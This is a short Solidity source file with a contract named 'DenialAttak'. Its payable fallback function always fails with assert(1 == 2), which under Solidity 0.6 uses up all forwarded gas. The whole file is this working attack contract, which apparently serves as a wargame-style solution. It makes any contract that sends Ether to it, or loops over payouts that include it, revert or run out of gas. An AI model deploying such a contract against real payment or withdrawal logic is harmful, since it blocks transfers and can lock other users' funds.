pragma solidity ^0.6.0;

contract DenialAttak {
    
    fallback() external payable {
        assert(1 == 2);
        
    }
}
